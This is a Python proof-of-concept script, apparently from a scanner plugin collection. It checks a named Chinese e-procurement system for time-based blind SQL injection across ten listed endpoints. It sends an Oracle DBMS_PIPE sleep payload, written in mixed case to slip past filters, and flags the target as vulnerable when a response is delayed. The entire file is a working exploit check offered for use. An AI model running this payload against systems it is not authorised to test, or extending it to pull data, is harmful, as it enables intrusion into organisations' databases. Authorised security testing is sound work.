#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 一采通电子采购系统多处时间盲注
referer: http://wooyun.org/bugs/wooyun-2010-0117552
         http://wooyun.org/bugs/wooyun-2010-0117795
         http://wooyun.org/bugs/wooyun-2010-0117552
         http://wooyun.org/bugs/wooyun-2010-0117545
         http://wooyun.org/bugs/wooyun-2010-079420
         http://wooyun.org/bugs/wooyun-2010-062918
author: Lucifer
description: 一采通多处时间盲注。
'''
import sys
import time
import requests



class caitong_multi_sleep_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        urls = ["/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1",
                "/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1",
                "/Price/SuggestList.aspx?priceid=1",
                "/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1",
                "/Products/Category/CategoryOption.aspx?option=IsStop&classId=1",
                "/custom/CompanyCGList.aspx?ComId=1",
                "/SuperMarket/InterestInfoDetail.aspx?ItemId=1",
                "/Orders/k3orderdetail.aspx?FINTERID=1",
                "/custom/CompanyCGList.aspx?ComId=1",
                "/custom/GroupNewsList.aspx?child=true&groupId=121"]
        payload = "%20AnD%206371=DbMs_PiPe.ReCeIvE_MeSsAgE(11,6)"
        try:
            for turl in urls:
                start_time = time.time()
                vulnurl = self.url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=20, verify=False)
                if time.time() - start_time >= 6:
                    return "[+]存在一采通电子采购系统时间盲注漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = caitong_multi_sleep_sqli_BaseVerify(sys.argv[1])
    testVuln.run()